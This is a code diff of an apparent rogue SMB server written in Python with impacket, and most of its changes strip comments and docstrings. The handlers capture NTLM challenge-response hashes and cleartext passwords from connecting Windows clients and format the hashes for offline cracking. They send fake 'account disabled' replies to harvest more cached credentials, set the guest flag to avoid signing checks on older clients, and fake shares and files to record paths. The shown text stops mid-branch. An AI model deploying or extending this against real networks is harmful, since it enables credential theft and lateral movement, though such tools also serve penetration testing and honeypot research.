-            # DomainName and ServerName - [MS-CIFS] §2.2.4.52.2
-            # Payload is the raw concatenation of DomainName + ServerName;
-            # the virtual DomainName/ServerName fields are parse-time only.
             _dialects_data["Payload"] = smbserver.encodeSMBString(
                 resp["Flags2"], cfg.smb_nb_domain
             ) + smbserver.encodeSMBString(resp["Flags2"], cfg.smb_nb_computer)
@@ -1188,35 +909,15 @@ class SMBHandler(BaseProtoHandler):
         token: bytes,
         command_name: str = "SMB2_SESSION_SETUP",
     ) -> tuple[bytes, int]:
-        """Handle the NTLMSSP 3-message authentication exchange.
-
-        NTLM authentication over SMB uses a 3-message handshake:
-          1. Client sends NEGOTIATE_MESSAGE (flags, version hints)
-          2. Server replies with CHALLENGE_MESSAGE (8-byte nonce, AV_PAIRs)
-          3. Client sends AUTHENTICATE_MESSAGE (hashed credentials)
-
-        The token may be wrapped in SPNEGO/GSSAPI (tags 0x60/0xA1) or
-        sent as raw NTLMSSP. This method unwraps SPNEGO if present, then
-        dispatches based on the NTLM message type byte at offset 8.
-
-        On the first call, allocates both SMB1 Uid and SMB2 SessionID
-        for this connection. After capturing credentials from the
-        AUTHENTICATE_MESSAGE, returns either STATUS_ACCOUNT_DISABLED
-        (to trigger a retry with different credentials) or the final
-        configured error code.
-        """
         is_gssapi = not token.startswith(b"NTLMSSP")
 
-        # Allocate session IDs on first session setup
         if self.smb2_session_id == 0:
-            # [MS-SMB2] §3.3.5.5.1: MUST NOT be 0 or -1
             self.smb2_session_id = secrets.randbelow(0xFFFFFFFFFFFFFFFE) + 1
         if self.smb1_uid == 0:
-            # [MS-SMB] §3.3.5.3: unique UID, 1..0xFFFF
             self.smb1_uid = secrets.randbelow(0xFFFE) + 1
 
         match token[0]:
-            case 0x60:  # [RFC4178] §4.2.1 / [MS-SPNG]: ASN.1 APPLICATION[0]
+            case 0x60:  # ASN.1 APPLICATION[0]
                 self.logger.debug(f"<{command_name}> GSSAPI negTokenInit", is_client=True)
                 try:
                     neg_token = spnego.SPNEGO_NegTokenInit(data=token)
@@ -1241,7 +942,7 @@ class SMBHandler(BaseProtoHandler):
                     )
                 token = neg_token["MechToken"]
 
-            case 0xA1:  # [RFC4178] §4.2.2 / [MS-SPNG]: ASN.1 CONTEXT[1]
+            case 0xA1:  # ASN.1 CONTEXT[1]
                 self.logger.debug(f"<{command_name}> GSSAPI negTokenArg", is_client=True)
                 try:
                     neg_token = spnego.SPNEGO_NegTokenResp(data=token)
@@ -1255,7 +956,7 @@ class SMBHandler(BaseProtoHandler):
             raise BaseProtoHandler.TerminateConnection
 
         match token[8]:
-            case 0x01:  # [MS-NLMP] §2.2.1.1: NEGOTIATE_MESSAGE
+            case 0x01:  # NEGOTIATE_MESSAGE
                 negotiate = ntlm.NTLMAuthNegotiate()
                 negotiate.fromString(token)
                 if not is_gssapi:
@@ -1263,10 +964,6 @@ class SMBHandler(BaseProtoHandler):
                         f"<{command_name}> NTLMSSP_NEGOTIATE_MESSAGE", is_client=True
                     )
 
-                # NTLM-layer NEGOTIATE parsing and logging stays in ntlm.py.
-                # Store the returned dict to pass through to ntlm_handle_authenticate_message
-                # for the deduped display line.  Do NOT merge into client_info
-                # - the SMB display line uses only SMB-layer fields.
                 self.ntlm_negotiate_fields = ntlm_handle_negotiate_message(
                     negotiate, self.logger
                 )
@@ -1297,10 +994,9 @@ class SMBHandler(BaseProtoHandler):
                 else:
                     resp = challenge
 
-                # [MS-SMB2] §3.3.5.5.3: auth still in progress
                 error_code = nt_errors.STATUS_MORE_PROCESSING_REQUIRED
 
-            case 0x02:  # [MS-NLMP] §2.2.1.2: CHALLENGE_MESSAGE - unexpected
+            case 0x02:  # CHALLENGE_MESSAGE
                 if not is_gssapi:
                     self.logger.debug(
                         f"<{command_name}> NTLMSSP_CHALLENGE_MESSAGE", is_client=True
@@ -1308,7 +1004,7 @@ class SMBHandler(BaseProtoHandler):
                 self.logger.debug("NTLM challenge message not supported!")
                 raise BaseProtoHandler.TerminateConnection
 
-            case 0x03:  # [MS-NLMP] §2.2.1.3: AUTHENTICATE_MESSAGE
+            case 0x03:  # AUTHENTICATE_MESSAGE
                 authenticate = ntlm.NTLMAuthChallengeResponse()
                 authenticate.fromString(token)
                 if not is_gssapi:
@@ -1316,9 +1012,6 @@ class SMBHandler(BaseProtoHandler):
                         f"<{command_name}> NTLMSSP_AUTHENTICATE_MESSAGE", is_client=True
                     )
 
-                # NTLM-layer AUTHENTICATE parsing and logging in ntlm.py.
-                # Returns True if real credentials were captured, False
-                # for anonymous or parse failures.
                 captured = ntlm_handle_authenticate_message(
                     authenticate,
                     challenge=self.config.ntlm_challenge,
@@ -1329,16 +1022,9 @@ class SMBHandler(BaseProtoHandler):
                 )
 
                 if not captured:
-                    # Anonymous probe or parse failure - reject so the
-                    # client retries with real credentials (XP sends
-                    # anonymous first, then the real auth).
                     error_code = nt_errors.STATUS_ACCESS_DENIED
                     resp = build_neg_token_resp(NEG_STATE_REJECT)
                 else:
-                    # Real credentials captured - resolve error code.
-                    # Returns STATUS_ACCOUNT_DISABLED for multi-cred
-                    # intermediate attempts, STATUS_SUCCESS for final
-                    # (to let client proceed to TREE_CONNECT for path).
                     error_code = self._resolve_auth_error_code()
                     if error_code == nt_errors.STATUS_SUCCESS:
                         resp = build_neg_token_resp(NEG_STATE_ACCEPT_COMPLETED)
@@ -1352,25 +1038,6 @@ class SMBHandler(BaseProtoHandler):
         return resp.getData(), error_code
 
     def _resolve_auth_error_code(self) -> int:
-        """Determine the NTSTATUS error code for the current auth attempt.
-
-        Windows SSPI retries authentication with alternate cached
-        credentials when it receives STATUS_ACCOUNT_DISABLED (0xC0000072).
-        This allows capturing multiple credential hashes per connection
-        (e.g., the interactive user's hash AND a service account hash).
-
-        When ``CapturesPerConnection`` is 0 (the default), multi-credential
-        retry is disabled.  The final auth response always returns
-        ``STATUS_SUCCESS`` so the client proceeds to TREE_CONNECT, where
-        the share path is captured before the configured error code is
-        returned.  When > 0, the first N-1 captures return
-        STATUS_ACCOUNT_DISABLED to trigger retries, and the Nth capture
-        returns STATUS_SUCCESS for the tree connect path capture.
-
-        When ``ErrorCode`` has been confiured to a valid value, it will
-        be returned regardless of whether ``CapturesPerConnection`` is
-        set.
-        """
         self.auth_attempt_count += 1
         max_captures = self.smb_config.smb_captures_per_connection
         error_code: int = nt_errors.STATUS_SUCCESS
@@ -1390,9 +1057,6 @@ class SMBHandler(BaseProtoHandler):
             error_code = self.smb_config.smb_error_code
 
         if error_code == nt_errors.STATUS_SUCCESS:
-            # Return SUCCESS to let the client proceed to TREE_CONNECT,
-            # where we capture the share path before returning the real
-            # error code.  See handle_smb2_tree_connect / handle_smb1_tree_connect.
             self.logger.debug(
                 "ErrorCode=0x%08x (STATUS_SUCCESS, awaiting tree connect)",
                 0,
@@ -1401,19 +1065,8 @@ class SMBHandler(BaseProtoHandler):
         return error_code
 
     def handle_smb2_session_setup(self, packet: smb2.SMB2Packet) -> None:
-        """Handle an SMB2 SESSION_SETUP request.
-
-        Carries the NTLMSSP authentication exchange wrapped in SPNEGO.
-        Extracts the security token from the request, passes it to
-        :meth:`handle_ntlmssp` for processing, and returns the response token
-        with the appropriate NTSTATUS code (STATUS_MORE_PROCESSING_REQUIRED
-        while the exchange is in progress, or the final error/success code).
-
-        Spec: [MS-SMB2] §3.3.5.5
-        """
         req = smb2.SMB2SessionSetup(data=packet["Data"])
 
-        # Log PreviousSessionId - [MS-SMB2] §2.2.5
         try:
             prev_session: int = req["PreviousSessionId"]
             prev_str = f"0x{prev_session:016x}" if prev_session else "(empty)"
@@ -1430,29 +1083,9 @@ class SMBHandler(BaseProtoHandler):
             req["Buffer"], command_name="SMB2_SESSION_SETUP"
         )
         command["SecurityBufferLength"] = len(resp_token)
-        # [MS-SMB2] §2.2.6: offset from header start (64 hdr + 8 fixed = 0x48)
         command["SecurityBufferOffset"] = 0x48
         command["Buffer"] = resp_token
 
-        # [MS-SMB2] §2.2.6 / §3.2.5.3.1: IS_GUEST (0x0001) sets
-        # Session.SigningRequired=FALSE on the client, so unsigned
-        # responses (including VALIDATE_NEGOTIATE_INFO) are accepted.
-        #
-        # Three-tier decision using SIGNING_REQUIRED + client max dialect:
-        #
-        #   1. SIGNING_REQUIRED set -> never IS_GUEST
-        #      §3.2.5.3.1: IS_GUEST + SigningRequired = client MUST fail.
-        #      Future-proofing for Win11 24H2+ / Server 2025.
-        #
-        #   2. Client max dialect ≤ 3.0.2 -> IS_GUEST
-        #      These clients (Win8.1, Srv2012R2, Srv2016) have
-        #      AllowInsecureGuestAccess=TRUE -> IS_GUEST accepted -> ✓
-        #
-        #   3. Client max dialect ≥ 3.1.1 -> no IS_GUEST
-        #      These clients (Win10, Win11, Srv2019, Srv2022) have
-        #      AllowInsecureGuestAccess=FALSE -> IS_GUEST rejected -> H.
-        #      Without IS_GUEST at 2.x they get P (path from
-        #      TREE_CONNECT before VALIDATE_NEGOTIATE RST).
         if error_code == nt_errors.STATUS_SUCCESS:
             if self.smb2_client_signing_required:
                 self.logger.debug(
@@ -1482,11 +1115,6 @@ class SMBHandler(BaseProtoHandler):
         )
 
     def handle_smb2_logoff(self, packet: smb2.SMB2Packet) -> None:
-        """Handle SMB2 LOGOFF -- [MS-SMB2] §3.3.5.6.
-
-        Logs the client logoff, resets the authenticated flag, and sends
-        a successful LOGOFF response.
-        """
         self.logger.debug("SMB2_LOGOFF", is_client=True)
 
         response = smb2.SMB2Logoff_Response()
@@ -1498,14 +1126,7 @@ class SMBHandler(BaseProtoHandler):
         )
 
     def handle_smb1_session_setup(self, packet: smb.NewSMBPacket) -> None:
-        """Handle SMB1 SESSION_SETUP_ANDX -- [MS-SMB] §3.3.5.3.
-
-        Dispatches to extended security (WordCount=12, NTLMSSP/SPNEGO via
-        :meth:`handle_ntlmssp`) or basic security (WordCount=13, raw
-        challenge/response via :meth:`handle_smb1_session_setup_basic`).
-        """
         command = smb.SMBCommand(packet["Data"][0])
-        # [MS-SMB] §2.2.4.6.1: WordCount == 0x0C for extended security
         if command["WordCount"] == 12:
             parameters = smb.SMBSessionSetupAndX_Extended_Response_Parameters()
             data = smb.SMBSessionSetupAndX_Extended_Response_Data(flags=packet["Flags2"])
@@ -1517,18 +1138,10 @@ class SMBHandler(BaseProtoHandler):
             setup_data["SecurityBlobLength"] = setup_params["SecurityBlobLength"]
             setup_data.fromString(command["Data"])
 
-            # Extract client OS and LAN Manager identification strings.
-            # impacket's AsciiOrUnicodeStructure has a UTF-16BE bug, so
-            # we manually parse from raw bytes after the SecurityBlob.
             try:
                 is_unicode = bool(packet["Flags2"] & smb.SMB.FLAGS2_UNICODE)
                 blob_len: int = setup_params["SecurityBlobLength"]
                 raw_after_blob = command["Data"][blob_len:]
-                # [MS-CIFS] §2.2.4.53.1: Unicode strings are 2-byte aligned
-                # from the start of the SMB header. Fixed overhead for
-                # WordCount=12: 32(hdr)+1(WC)+24(params)+2(BC) = 59 (odd).
-                # Padding needed when (59 + blob_len) is odd -> blob_len even.
-                # Cannot check byte value: NT 4.0 uses non-zero pad bytes.
                 needs_pad = is_unicode and blob_len % 2 == 0
                 if needs_pad and len(raw_after_blob) > 0:
                     raw_after_blob = raw_after_blob[1:]
@@ -1574,7 +1187,6 @@ class SMBHandler(BaseProtoHandler):
                 error_code=error_code,
             )
         elif command["WordCount"] == 13:
-            # Non-extended security - [MS-CIFS] §2.2.4.53.1
             self.handle_smb1_session_setup_basic(packet, command)
         else:
             self.logger.warning(
@@ -1588,54 +1200,24 @@ class SMBHandler(BaseProtoHandler):
         packet: smb.NewSMBPacket,
         command: smb.SMBCommand,
     ) -> None:
-        """Handle SMB1 non-extended SESSION_SETUP_ANDX (WordCount=13).
-
-        This path handles pre-Vista clients and embedded SMB stacks that
-        don't support NTLMSSP/SPNEGO. Instead of a 3-message NTLMSSP
-        exchange, the client sends raw LM and NT challenge-response hashes
-        (or cleartext passwords) directly in the OEMPassword and
-        UnicodePassword fields of the session setup request.
-
-        The server sent an 8-byte challenge in the negotiate response;
-        the client hashed its password against that challenge. This method
-        extracts those raw hashes, classifies them (NetNTLMv1 vs NetNTLMv2
-        based on response length), and formats them for offline cracking.
-
-        Also detects unexpected cleartext despite challenge (non-standard
-        response lengths per [MS-CIFS] §3.2.4.2.4).
-
-        Spec: [MS-CIFS] §2.2.4.53.1 (request), §2.2.4.53.2 (response),
-              §3.2.4.2.4 (plaintext-despite-challenge)
-        """
         cfg = self.smb_config
         setup_params = smb.SMBSessionSetupAndX_Parameters(command["Parameters"])
 
         oem_len: int = setup_params["AnsiPwdLength"]
         uni_len: int = setup_params["UnicodePwdLength"]
         is_unicode = bool(packet["Flags2"] & smb.SMB.FLAGS2_UNICODE)
-        # [MS-CIFS] §2.2.4.53.1 - manually parse the data section.
-        # impacket's AsciiStructure truncates at \x00 (wrong for Unicode)
-        # and UnicodeStructure decodes as UTF-16BE (impacket bug).
         raw_data: bytes = command["Data"]
-        # Password fields come first at known offsets
         oem_pwd: bytes = raw_data[:oem_len] if oem_len else b""
         uni_pwd: bytes = raw_data[oem_len : oem_len + uni_len] if uni_len else b""
 
-        # Determine transport type FIRST - needed for string parsing.
         if oem_len == 0 and uni_len == 0:
-            # Anonymous - no credentials at all
             transport: str | None = None
         elif uni_len == 0 and oem_len <= 1 and oem_pwd in (b"", b"\x00"):
-            # NT 4.0 null session: OemPwdLen=1 with value \x00.
-            # [MS-NLMP] §3.2.5.1.2: Z(1) LmChallengeResponse = anonymous.
             transport = None
         elif (
-            # Only OEM populated with non-standard length (not 0, not 24)
             (uni_len == 0 and oem_len not in (0, 24) and oem_len <= 256)
-            # Only Unicode populated with non-standard length
             or (oem_len == 0 and uni_len not in (0, 24) and uni_len <= 512)
         ):
-            # Unexpected plaintext despite challenge - [MS-CIFS] §3.2.4.2.4
             self.logger.debug(
                 "SMB_COM_SESSION_SETUP_ANDX: plaintext password detected "
                 "despite challenge (unusual client behavior)",
@@ -1645,27 +1227,15 @@ class SMBHandler(BaseProtoHandler):
         else:
             transport = NTLM_TRANSPORT_RAW
 
-        # String fields follow passwords: Account, PrimaryDomain, NativeOS, NativeLanMan
-        # Each is null-terminated in the encoding indicated by FLAGS2_UNICODE.
         string_data = raw_data[oem_len + uni_len :]
-        # [MS-CIFS] §2.2.4.53.1: Unicode strings are 2-byte aligned from
-        # the SMB header start. Fixed overhead for WordCount=13:
-        # 32(hdr)+1(WC)+26(params)+2(BC) = 61 (odd). Padding needed when
-        # (61 + oem_len + uni_len) is odd, i.e., (oem_len + uni_len) even.
-        # Cannot check byte value: NT 4.0 uses non-zero pad bytes (0x69).
         needs_pad = is_unicode and (oem_len + uni_len) % 2 == 0
         if needs_pad and len(string_data) > 0:
             string_data = string_data[1:]
         strings = _split_smb_strings(string_data, is_unicode)
 
-        # For anonymous sessions, Account and PrimaryDomain may be absent
-        # or encoded as single ASCII null bytes despite FLAGS2_UNICODE
-        # (observed on NT 4.0). The positional parser would assign NativeOS
-        # to account. Detect anonymous and parse only OS/LanMan fields.
         if transport is None:
             account = ""
             domain = ""
-            # Best-effort: first two non-empty strings are NativeOS/NativeLanMan
             client_os = strings[0] if len(strings) > 0 else ""
             client_lanman = strings[1] if len(strings) > 1 else ""
         else:
@@ -1694,17 +1264,10 @@ class SMBHandler(BaseProtoHandler):
 
         # Capture credentials
         if transport == NTLM_TRANSPORT_CLEARTEXT:
-            # [MS-CIFS] §2.2.4.53.1: cleartext in UnicodePassword (UTF-16LE)
-            # when FLAGS2_UNICODE, else in OEMPassword (ASCII)
             if packet["Flags2"] & smb.SMB.FLAGS2_UNICODE and uni_pwd:
                 pwd_data = uni_pwd
-                # [MS-CIFS] §2.2.4.53.1: UnicodePassword starts at offset
-                # 61 + OemPwdLen from the SMB header. When this is odd,
-                # clients (smbclient) prepend a 1-byte alignment pad
-                # included in UnicodePasswordLen. Strip it for decode.
                 if (oem_len % 2 == 0) and len(pwd_data) > 0:
                     pwd_data = pwd_data[1:]
-                # Trim to even length for valid UTF-16LE decode
                 if len(pwd_data) % 2 == 1:
                     pwd_data = pwd_data[:-1]
                 password = pwd_data.decode("utf-16-le", errors="replace").rstrip("\x00")
@@ -1751,9 +1314,6 @@ class SMBHandler(BaseProtoHandler):
                 extras=extras or None,
             )
         else:
-            # Anonymous - reject to force the client to retry with real
-            # credentials.  Without this, XP's redirector uses the anonymous
-            # session for the share and never sends real hashes.
             self.logger.debug(
                 "Anonymous basic-security session, rejecting", is_client=True
             )
@@ -1778,11 +1338,9 @@ class SMBHandler(BaseProtoHandler):
             )
             return
 
-        # Allocate Uid for this session - [MS-SMB] §3.3.5.3
         if self.smb1_uid == 0:
             self.smb1_uid = secrets.randbelow(0xFFFE) + 1
 
-        # Build response - [MS-CIFS] §2.2.4.53.2 (WordCount=3)
         resp_params = smb.SMBSessionSetupAndXResponse_Parameters()
         resp_data = smb.SMBSessionSetupAndXResponse_Data(flags=packet["Flags2"])
         resp_params["Action"] = 0
@@ -1796,9 +1354,7 @@ class SMBHandler(BaseProtoHandler):
             packet["Flags2"], cfg.smb_nb_domain
         )
 
-        # Determine error code - multi-cred or final
         error_code = self._resolve_auth_error_code()
-
         self.send_smb1_command(
             smb.SMB.SMB_COM_SESSION_SETUP_ANDX,
             resp_data,
@@ -1808,14 +1364,8 @@ class SMBHandler(BaseProtoHandler):
         )
 
     def handle_smb1_logoff(self, packet: smb.NewSMBPacket) -> None:
-        """Handle SMB1 LOGOFF_ANDX -- [MS-CIFS] §2.2.4.54.
-
-        Sends a proper LOGOFF response (AndX parameters only, no data)
-        and terminates the connection.
-        """
         self.logger.debug("SMB_COM_LOGOFF_ANDX", is_client=True)
 
-        # SMBLogOffAndX packs the AndX response: 0xFF,0x00,0x0000
         parameters = smb.SMBLogOffAndX()
         self.send_smb1_command(
             smb.SMB.SMB_COM_LOGOFF_ANDX,
@@ -1826,11 +1376,6 @@ class SMBHandler(BaseProtoHandler):
         raise BaseProtoHandler.TerminateConnection
 
     def _extract_smb2_tree_path(self, packet: smb2.SMB2Packet) -> str:
-        r"""Extract the UNC path from an SMB2 TREE_CONNECT request.
-
-        Uses the raw ``PathOffset``/``PathLength`` fields from the wire
-        rather than impacket's ``Buffer`` field (which has alignment issues).
-        """
         req = smb2.SMB2TreeConnect(data=packet["Data"])
         raw_data: bytes = packet["Data"]
         path_offset: int = req.fields["PathOffset"] - 64
@@ -1845,18 +1390,6 @@ class SMBHandler(BaseProtoHandler):
         return ""
 
     def handle_smb2_tree_connect(self, packet: smb2.SMB2Packet) -> None:
-        r"""SMB2 TREE_CONNECT handler -- [MS-SMB2] §3.3.5.7.
-
-        Accepts all tree connects to simulate a real SMB file server:
-
-        - **IPC$**: accepted as ``SMB2_SHARE_TYPE_PIPE`` so the client
-          can issue DFS referral / srvsvc queries before connecting to
-          the real share.
-        - **Non-IPC$**: accepted as ``SMB2_SHARE_TYPE_DISK`` so the
-          client proceeds to CREATE / READ / CLOSE, allowing filename
-          capture.  The share path (e.g. ``\\\\10.0.0.50\\share``) is
-          recorded in :attr:`client_info`.
-        """
         path = ""
         try:
             path = self._extract_smb2_tree_path(packet)
@@ -1888,11 +1421,9 @@ class SMBHandler(BaseProtoHandler):
                 is_server=True,
             )
         else:
-            # Non-IPC$ disk share - capture the path for intelligence
             if path:
                 self.client_info["smb_path"] = path
             resp["ShareType"] = 0x01  # SMB2_SHARE_TYPE_DISK
-            # [MS-SMB2] §2.2.10: 0 = default caching (matches real Windows)
             resp["ShareFlags"] = 0x00000000
             self.logger.debug(
                 "SMB2_TREE_CONNECT share accepted (TreeId=%d, path=%s)",
@@ -1904,12 +1435,6 @@ class SMBHandler(BaseProtoHandler):
         self.send_smb2_command(resp.getData(), packet, tree_id=self.smb2_tree_id_counter)
 
     def handle_smb2_tree_disconnect(self, packet: smb2.SMB2Packet) -> None:
-        """SMB2 TREE_DISCONNECT handler -- [MS-SMB2] §3.3.5.8.
-
-        Acknowledges tree disconnect requests.  Per [MS-SMB2] §2.2.12,
-        the response is a 4-byte structure with only StructureSize and
-        Reserved.
-        """
         self.logger.debug(
             "SMB2_TREE_DISCONNECT TreeId=%d", packet["TreeID"], is_client=True
         )
@@ -1917,21 +1442,6 @@ class SMBHandler(BaseProtoHandler):
         self.send_smb2_command(resp.getData(), packet)
 
     def handle_smb2_ioctl(self, packet: smb2.SMB2Packet) -> None:
-        """SMB2 IOCTL handler -- [MS-SMB2] §3.3.5.15.
-
-        Handles two critical IOCTL codes:
-
-        - **FSCTL_VALIDATE_NEGOTIATE_INFO** (0x00140204): SMB 3.0+ clients
-          send this after IPC$ tree connect to verify negotiate parameters
-          haven't been tampered with.  Per §3.3.5.15.12, the server MUST
-          respond with its Capabilities, Guid, SecurityMode, and Dialect.
-
-        - **FSCTL_DFS_GET_REFERRALS** (0x00060194): Per §3.3.5.15.2,
-          non-DFS servers MUST return ``STATUS_FS_DRIVER_REQUIRED``.
-
-        All other codes return ``STATUS_FS_DRIVER_REQUIRED``.
-        """
-        ctl_code = 0
         try:
             req = smb2.SMB2Ioctl(packet["Data"])
             ctl_code = req["CtlCode"]
@@ -1942,21 +1452,13 @@ class SMBHandler(BaseProtoHandler):
             return
 
         if ctl_code == smb2.FSCTL_VALIDATE_NEGOTIATE_INFO:
-            # [MS-SMB2] §3.3.5.15.12: echo back server negotiate params
             self._handle_validate_negotiate(packet, req)
         else:
-            # [MS-SMB2] §3.3.5.15.2: non-DFS -> STATUS_FS_DRIVER_REQUIRED
             self._smb2_error_response(packet, nt_errors.STATUS_FS_DRIVER_REQUIRED)
 
     def _handle_validate_negotiate(
         self, packet: smb2.SMB2Packet, req: smb2.SMB2Ioctl
     ) -> None:
-        """Handle FSCTL_VALIDATE_NEGOTIATE_INFO -- [MS-SMB2] §3.3.5.15.12.
-
-        The client sends its view of the negotiated parameters. The server
-        responds with its own values so the client can verify they match.
-        If they don't, the client drops the connection (anti-downgrade).
-        """
         try:
             vni = smb2.VALIDATE_NEGOTIATE_INFO(req["Buffer"])
             self.logger.debug(
@@ -1966,8 +1468,6 @@ class SMBHandler(BaseProtoHandler):
                 is_client=True,
             )
 
-            # Build response echoing our negotiate values.
-            # These MUST match what we sent in SMB2_NEGOTIATE_RESPONSE.
             server: SMBServer = self.server  # type: ignore[assignment]
             vnir = smb2.VALIDATE_NEGOTIATE_INFO_RESPONSE()
             vnir["Capabilities"] = SMB2_SERVER_CAPABILITIES
@@ -1998,44 +1498,19 @@ class SMBHandler(BaseProtoHandler):
             self._smb2_error_response(packet, nt_errors.STATUS_ACCESS_DENIED)
 
     def handle_smb1_tree_connect(self, packet: smb.NewSMBPacket) -> None:
-        r"""SMB1 TREE_CONNECT_ANDX handler -- [MS-CIFS] §2.2.4.55.
-
-        Accepts all tree connects to simulate a real SMB file server:
-
-        - **IPC$**: accepted so the client can proceed to the real share.
-        - **Non-IPC$**: accepted so the client proceeds to NT_CREATE /
-          READ, allowing filename capture.  The share path is recorded
-          in :attr:`client_info`.
-        """
         path = ""
         try:
-            # [MS-CIFS] §2.2.4.55.1: SMB_COM_TREE_CONNECT_ANDX Request
-            # Use impacket for Parameters parsing (PasswordLength), but
-            # extract the Path manually because impacket's
-            # SMBTreeConnectAndX_Data has no alignment-pad field between
-            # Password and Path - when PasswordLength causes an odd SMB
-            # offset, the client inserts a pad byte that impacket's 'u'
-            # format parser includes in the Path, producing garbled
-            # UTF-16LE.  This only happens with even PasswordLength
-            # values (0, 2, 24), but PasswordLength=1 (the common case)
-            # is immune because 43+1=44 is already even-aligned.
             cmd = smb.SMBCommand(packet["Data"][0])
             params = smb.SMBTreeConnectAndX_Parameters(cmd["Parameters"])
             pwd_len: int = params["PasswordLength"]
             raw_data: bytes = cmd["Data"]
             is_unicode = bool(packet["Flags2"] & smb.SMB.FLAGS2_UNICODE)
 
-            # Skip Password bytes, then compute alignment pad.
-            # [MS-CIFS] §2.2.4.55.1: Unicode Path must be 2-byte aligned
-            # from the SMB header start.  Fixed overhead before Data:
-            # 32(hdr) + 1(WordCount) + 8(Parameters) + 2(ByteCount) = 43.
-            # Pad exists when (43 + PasswordLength) is odd.
             offset = pwd_len
             if is_unicode and (43 + pwd_len) % 2 == 1:
                 offset += 1  # skip alignment pad byte
 
             if is_unicode:
-                # Find UTF-16LE null terminator (\x00\x00 at even boundary)
                 end = offset
                 while end + 1 < len(raw_data):
                     if (
@@ -2047,7 +1522,6 @@ class SMBHandler(BaseProtoHandler):
                     end += 1
                 path = raw_data[offset:end].decode("utf-16-le", errors="replace")
             else:
-                # ASCII null-terminated path
                 end = raw_data.find(b"\x00", offset)
                 if end < 0:
                     end = len(raw_data)
@@ -2078,8 +1552,6 @@ class SMBHandler(BaseProtoHandler):
             self.logger.debug("SMB1 TREE_CONNECT IPC$ accepted", is_server=True)
             resp_data["Service"] = b"IPC\x00"
         else:
-            # Non-IPC$ disk share - accept so client proceeds to
-            # NT_CREATE / READ, allowing filename capture.
             if path:
                 self.client_info["smb_path"] = path
             resp_data["Service"] = b"A:\x00"
@@ -2095,12 +1567,6 @@ class SMBHandler(BaseProtoHandler):
         )
 
     def handle_smb1_tree_disconnect(self, packet: smb.NewSMBPacket) -> None:
-        """SMB1 TREE_DISCONNECT handler -- [MS-CIFS] §3.3.5.29.
-
-        Acknowledges tree disconnect requests.  ``SMB_COM_TREE_DISCONNECT``
-        is NOT an AndX command - the response has zero parameter words
-        and zero data bytes.
-        """
         self.logger.debug("SMB_COM_TREE_DISCONNECT Tid=%d", packet["Tid"], is_client=True)
         self.send_smb1_command(
             smb.SMB.SMB_COM_TREE_DISCONNECT,
@@ -2110,15 +1576,6 @@ class SMBHandler(BaseProtoHandler):
         )
 
     def handle_smb2_create(self, packet: smb2.SMB2Packet) -> None:
-        """SMB2 CREATE handler -- [MS-SMB2] §3.3.5.9.
-
-        Returns a fake FileId with ``STATUS_SUCCESS`` so the client
-        proceeds to READ / QUERY_DIRECTORY, allowing filename capture.
-        The ``CreateAction`` is ``FILE_OPENED`` (1) and timestamps are
-        set to the current server time.  Empty names (directory opens)
-        get ``FILE_ATTRIBUTE_DIRECTORY``; all others get
-        ``FILE_ATTRIBUTE_NORMAL``.
-        """
         name = ""
         try:
             req = smb2.SMB2Create(packet["Data"])
@@ -2150,7 +1607,6 @@ class SMBHandler(BaseProtoHandler):
         resp["ChangeTime"] = now
         resp["AllocationSize"] = 0
         resp["EndOfFile"] = 0
-        # [MS-FSCC] §2.6: DIRECTORY (0x10) or ARCHIVE (0x20) per real Windows
         resp["FileAttributes"] = (
             smb2.FILE_ATTRIBUTE_DIRECTORY if is_dir else smb2.FILE_ATTRIBUTE_ARCHIVE
         )
@@ -2174,12 +1630,6 @@ class SMBHandler(BaseProtoHandler):
         self.send_smb2_command(resp.getData(), packet)
 
     def handle_smb2_query_directory(self, packet: smb2.SMB2Packet) -> None:
-        """SMB2 QUERY_DIRECTORY handler -- [MS-SMB2] §3.3.5.18.
-
-        Returns ``STATUS_NO_MORE_FILES`` for all directory queries.
-        The fake directories are empty, so enumeration returns no
-        entries immediately.
-        """
         try:
             req = smb2.SMB2QueryDirectory(packet["Data"])
             name_offset = req["FileNameOffset"] - 64
@@ -2195,21 +1645,6 @@ class SMBHandler(BaseProtoHandler):
         self._smb2_error_response(packet, nt_errors.STATUS_NO_MORE_FILES)
 
     def handle_smb2_query_info(self, packet: smb2.SMB2Packet) -> None:
-        """SMB2 QUERY_INFO handler -- [MS-SMB2] §3.3.5.20.
-
-        Returns fake file metadata so clients proceed normally after
-        CREATE.  Only ``InfoType=FILE`` (0x01) is handled; all other
-        info types return ``STATUS_NOT_SUPPORTED``.
-
-        Observed in pcap: clients send two FileInfoClass values:
-
-        - **FileNetworkOpenInfo** (34): timestamps + size + attributes.
-          Sent by Win7, Win8.1, Srv2008, Srv2008R2, Srv2012R2.
-        - **FileStandardInfo** (5): size + link count + directory flag.
-          Sent by Srv2008.
-        """
-        info_type = 0
-        file_info_class = 0
         try:
             req = smb2.SMB2QueryInfo(packet["Data"])
             info_type = req["InfoType"]
@@ -2225,12 +1660,7 @@ class SMBHandler(BaseProtoHandler):
             self._smb2_error_response(packet, nt_errors.STATUS_INVALID_PARAMETER)
             return
 
-        # InfoType=0x02 (FILESYSTEM): return minimal FileFsDeviceInformation
-        # so clients proceed normally.  Security (0x03) and Quota (0x04)
-        # are not needed for a capture server.
         if info_type == 0x02:
-            # [MS-FSCC] §2.5.10: FileFsDeviceInformation (8 bytes)
-            # DeviceType(4) = FILE_DEVICE_DISK (0x07) + Characteristics(4) = 0
             fs_data = (7).to_bytes(4, "little") + b"\x00\x00\x00\x00"
             resp = smb2.SMB2QueryInfo_Response()
             resp["OutputBufferOffset"] = 0x48
@@ -2255,8 +1685,6 @@ class SMBHandler(BaseProtoHandler):
         output_data: bytes | None = None
 
         if file_info_class == smb2.SMB2_FILE_NETWORK_OPEN_INFO:
-            # [MS-FSCC] §2.4.29: FILE_NETWORK_OPEN_INFORMATION
-            # 56 bytes: 4×FILETIME + AllocationSize + EndOfFile + Attributes + Reserved
             info = smb.SMBFileNetworkOpenInfo()
             info["CreationTime"] = now
             info["LastAccessTime"] = now
@@ -2268,8 +1696,6 @@ class SMBHandler(BaseProtoHandler):
             output_data = info.getData()
 
         elif file_info_class == smb2.SMB2_FILE_STANDARD_INFO:
-            # [MS-FSCC] §2.4.41: FILE_STANDARD_INFORMATION
-            # 24 bytes: AllocationSize + EndOfFile + NumberOfLinks + DeletePending + Directory
             info = smb2.FILE_STANDARD_INFORMATION()
             info["AllocationSize"] = 0
             info["EndOfFile"] = 0
@@ -2279,7 +1705,6 @@ class SMBHandler(BaseProtoHandler):
             output_data = info.getData()
 
         elif file_info_class == smb2.SMB2_FILE_BASIC_INFO:
